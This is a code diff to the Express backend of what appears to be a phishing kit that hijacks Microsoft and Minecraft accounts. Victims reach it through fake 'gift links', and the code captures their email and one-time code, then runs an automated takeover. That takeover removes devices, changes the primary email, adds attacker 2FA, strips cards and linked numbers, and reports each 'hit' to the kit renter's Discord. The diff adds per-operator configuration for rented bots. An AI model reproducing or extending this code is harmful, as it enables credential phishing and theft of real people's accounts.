@@ -79,8 +79,14 @@ app.use(async (req, res, next) => {
                 });
             }
         }
-    } catch (e) {}
-    next();
+        next();
+    } catch (err) {
+        next();
+    }
+});
+
+app.get('/api/health', (req, res) => {
+    res.json({ success: true, service: 'backend', uptime: process.uptime(), time: Date.now() });
 });
 
 app.use((req, res, next) => {
@@ -107,24 +113,24 @@ app.use((req, res, next) => {
 // Endpoint to receive realtime visitor & checkout activity from web
 app.post('/api/web-activity', async (req, res) => {
     try {
-        const { code, username, email, action, statusText, link, domain } = req.body || {};
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
-        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+        const { code, username, email, statusText, domain } = req.body || {};
+        // Only log if username and email are both provided
+        if (username && email) {
+            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+            const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
 
-        await sendWebLog({
-            code,
-            ip: clientIp,
-            link,
-            domain: domain || req.headers.host || 'donutmp.store',
-            username,
-            email,
-            action: action || 'input',
-            statusText: statusText || 'Click Continue'
-        });
+            await sendWebLog({
+                code,
+                ip: clientIp,
+                domain: domain || req.headers.host || config.webDomain || 'localhost:3000',
+                username,
+                email,
+                statusText: statusText || 'Send Code'
+            });
+        }
 
         return res.json({ success: true });
     } catch (err) {
-        console.error('[API /web-activity] Error logging:', err.message);
         return res.status(500).json({ success: false, error: err.message });
     }
 });
@@ -141,9 +147,40 @@ app.get('/api/health', (req, res) => {
 
 app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
     try {
-        let { email, username } = req.body;
+        let { email, username, giftCode, code: altCode } = req.body;
         email = (email || '').trim();
         username = (username || '').trim();
+        const curGiftCode = (giftCode || altCode || '').trim();
+
+        // Check gift link validity and 30-min expiration if code provided
+        let resolvedBotUserId = null;
+        let resolvedBotNumber = 1;
+
+        if (curGiftCode) {
+            const EXPIRY_MS = 30 * 60 * 1000;
+            const now = Date.now();
+            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
+            if (!giftRows || giftRows.length === 0 || (now - giftRows[0].created_at > EXPIRY_MS)) {
+                if (giftRows && giftRows.length > 0) {
+                    await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
+                }
+                return res.status(410).json({
+                    success: false,
+                    error: 'Gift link has expired after 30 minutes. Please ask for a new link!'
+                });
+            }
+            resolvedBotUserId = giftRows[0].bot_user_id;
+            resolvedBotNumber = giftRows[0].bot_number || 1;
+
+            const { checkWebAccess } = require('../autosecure/utils/web/webAccess');
+            const ownerWebAccess = await checkWebAccess(resolvedBotUserId);
+            if (!ownerWebAccess.hasAccess) {
+                return res.status(403).json({
+                    success: false,
+                    error: 'Dịch vụ web của người gửi hiện đang tạm ngưng do hết hạn bản quyền.'
+                });
+            }
+        }
 
         if (!email) {
             return res.status(400).json({
@@ -161,7 +198,18 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
 
         const profiles = await getCredentials(email, false);
 
+        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
+
         if (!profiles) {
+            sendWebLog({
+                code: curGiftCode,
+                ip: clientIp,
+                username: username || 'Player',
+                email,
+                statusText: 'Invalid Email'
+            }).catch(() => {});
+
             return res.status(404).json({
                 success: false,
                 error: 'Microsoft account not found for this email.'
@@ -173,6 +221,14 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
             profiles.Credentials?.Proofs;
 
         if (!eligibleProofs || eligibleProofs.length === 0) {
+            sendWebLog({
+                code: curGiftCode,
+                ip: clientIp,
+                username: username || 'Player',
+                email,
+                statusText: 'No security options'
+            }).catch(() => {});
+
             return res.status(400).json({
                 success: false,
                 error: 'This Microsoft account does not have email OTP verification enabled.'
@@ -192,12 +248,24 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
             });
         }
 
+        // Log to Discord: Minecraft Username + Email entered and OTP successfully sent
+        sendWebLog({
+            code: curGiftCode,
+            ip: clientIp,
+            username: username || 'Player',
+            email,
+            statusText: 'Send Code'
+        }).catch(() => {});
+
         const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
         activeSessions.set(sessionId, {
             email,
             secData,
             secDisplay,
             username,
+            giftCode: curGiftCode,
+            botUserId: resolvedBotUserId,
+            botNumber: resolvedBotNumber,
             timestamp: Date.now()
         });
 
@@ -221,14 +289,29 @@ app.post('/api/send-otp', sendOtpLimiter, async (req, res) => {
 
 app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
     try {
-        let { sessionId, email, secId, code, username } = req.body;
+        let { sessionId, email, secId, code, username, giftCode, code: altCode } = req.body;
         code = (code || '').toString().trim();
+        let curGiftCode = (giftCode || altCode || '').trim();
+        let botUserId = null;
+        let botNumber = 1;
 
         if (sessionId && activeSessions.has(sessionId)) {
             const sess = activeSessions.get(sessionId);
             if (!email) email = sess.email;
             if (!secId) secId = sess.secData;
             if (!username) username = sess.username;
+            if (!curGiftCode) curGiftCode = sess.giftCode;
+            botUserId = sess.botUserId;
+            botNumber = sess.botNumber || 1;
+        }
+
+        // If botUserId not yet resolved from session, query from gift_links
+        if (!botUserId && curGiftCode) {
+            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
+            if (giftRows && giftRows.length > 0) {
+                botUserId = giftRows[0].bot_user_id;
+                botNumber = giftRows[0].bot_number || 1;
+            }
         }
 
         email = (email || '').trim();
@@ -261,27 +344,115 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
 
         const uid = await generateuid();
 
+        // Fetch user custom autosecure config if botUserId found
+        let userConfig = null;
+        if (botUserId) {
+            let userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?', [botUserId, botNumber]);
+            if (!userRows || userRows.length === 0) {
+                userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? LIMIT 1', [botUserId]);
+            }
+            if (userRows && userRows.length > 0) {
+                userConfig = userRows[0];
+            }
+        }
+
+        const effectiveUserId = botUserId || "web_system";
         const settings = {
-            user_id: "web_system",
-            botnumber: 1,
-            auto_secure: 1,
-            exploit: 1,
-            oauthapps: 1,
-            removedevices: 1,
-            signout: 1,
-            changeprimary: 1,
-            secureifnomc: 1,
-            addzyger: 1,
-            removecards: 1,
-            leavefamily: 1,
-            removelinkednumbers: 1,
-            webhook: config.notifierWebhook || "",
-            prefix: "HachiiroMC",
-            domain: (config.domains && config.domains[0]) || "thapcamstore.click",
-            pfp: config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
-            ping: "@everyone",
-            aftersecure: "nothing"
+            ...(userConfig || {}),
+            user_id: effectiveUserId,
+            botnumber: botNumber,
+
+            // Row 1 (Discord Settings embed)
+            auto_secure: userConfig?.auto_secure ?? 1,
+            change_ign: userConfig?.change_ign ?? 0,
+            multiplayer: userConfig?.multiplayer ?? 0,
+
+            // Row 2
+            secureifnomc: userConfig?.secureifnomc ?? 1,
+            checkban: userConfig?.checkban ?? 0,
+            checkban_hypixel: userConfig?.checkban_hypixel ?? userConfig?.checkban ?? 0,
+            checkban_donut: userConfig?.checkban_donut ?? 0,
+            autoquarantine: userConfig?.autoquarantine ?? 0,
+
+            // Row 3
+            oauthapps: userConfig?.oauthapps ?? 1,
+            exploit: userConfig?.exploit ?? 1,
+            removedevices: userConfig?.removedevices ?? 1,
+
+            // Row 4
+            addzyger: userConfig?.addzyger ?? 1,
+            signout: userConfig?.signout ?? 1,
+            changegamertag: userConfig?.changegamertag ?? 0,
+
+            // Row 5
+            subscribemail: userConfig?.subscribemail ?? 0,
+            changeprimary: userConfig?.changeprimary ?? 1,
+            domain: userConfig?.domain || (config.domains && config.domains[0]) || "thapcamstore.click",
+
+            // Embed 2 (Personalization)
+            changename: userConfig?.changename ?? 0,
+            name: userConfig?.name || null,
+            changedob: userConfig?.changedob ?? 0,
+            dob: userConfig?.dob || null,
+            changepfp: userConfig?.changepfp ?? 0,
+            pfp: userConfig?.pfp || config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
+            changelanguage: userConfig?.changelanguage ?? 0,
+            language: userConfig?.language || 'en-US',
+            prefix: userConfig?.prefix || "vingr0ub",
+
+            // Other configs
+            removecards: userConfig?.removecards ?? 0,
+            leavefamily: userConfig?.leavefamily ?? 1,
+            removelinkednumbers: userConfig?.removelinkednumbers ?? 1,
+            webhook: userConfig?.webhook || config.notifierWebhook || "",
+            ping: userConfig?.ping || "@everyone",
+            aftersecure: userConfig?.aftersecure || "nothing",
+            hits_channel: userConfig?.hits_channel || null,
+            logs_channel: userConfig?.logs_channel || null,
+            notification_channel: userConfig?.notification_channel || null,
+            users_channel: userConfig?.users_channel || null,
+            server_id: userConfig?.server_id || null,
+            claiming: userConfig?.claiming ?? 0
         };
+
+        console.log(`[API /verify-otp] Áp dụng cấu hình Autosecure của bot con (${effectiveUserId}):`);
+        console.log(` • Autosecure    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
+        console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Zyger 2FA     : ${settings.addzyger ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change Primary: ${settings.changeprimary ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Prefix        : ${settings.prefix}`);
+        console.log(` • Domain MCS    : ${settings.domain}`);
+        console.log(` • Change Name   : ${settings.changename ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change DOB/Reg: ${settings.changedob ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change PFP    : ${settings.changepfp ? 'BẬT' : 'TẮT'}`);
+        console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);
+
+        if (!settings.auto_secure) {
+            console.log(`[API /verify-otp] Bot con đã tắt Autosecure! Lưu mã vào danh sách chờ claim thủ công.`);
+            const embedData = {
+                embeds: [{
+                    title: `${username || 'Account'}! :x:`,
+                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*Autosecure đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
+                    color: 0x00ff00
+                }]
+            };
+            await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
+                [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});
+
+            if (curGiftCode) {
+                await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
+            }
+            if (sessionId) activeSessions.delete(sessionId);
+
+            return res.json({
+                success: true,
+                uid,
+                username: username || email,
+                message: 'Mã xác nhận hợp lệ. Vui lòng dùng lệnh /claim trong Discord để nhận tài khoản!'
+            });
+        }
 
         let acc = await secure(host, settings, uid, username);
 
@@ -300,8 +471,9 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
             } catch (e) {}
         }
 
+        // Save account mapped to the specific bot owner
         try {
-            await insertaccount(acc, uid, "web_system", settings.secureifnomc);
+            await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
         } catch (dbErr) {
             console.error('[API /verify-otp] DB Error:', dbErr.message);
         }
@@ -327,9 +499,15 @@ app.post('/api/verify-otp', verifyOtpLimiter, async (req, res) => {
                 networkLevel: hypixelStats?.networkLevel || '0'
             };
 
-            await sendSecureNotification(null, accountData);
+            const clientTarget = { username: effectiveUserId, botnumber: botNumber };
+            await sendSecureNotification(clientTarget, accountData);
         } catch (whError) {
             console.error('[API /verify-otp] Webhook Error:', whError.message);
+        }
+
+        // Consume gift link so it cannot be reused
+        if (curGiftCode) {
+            await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
         }
 
         if (sessionId) activeSessions.delete(sessionId);
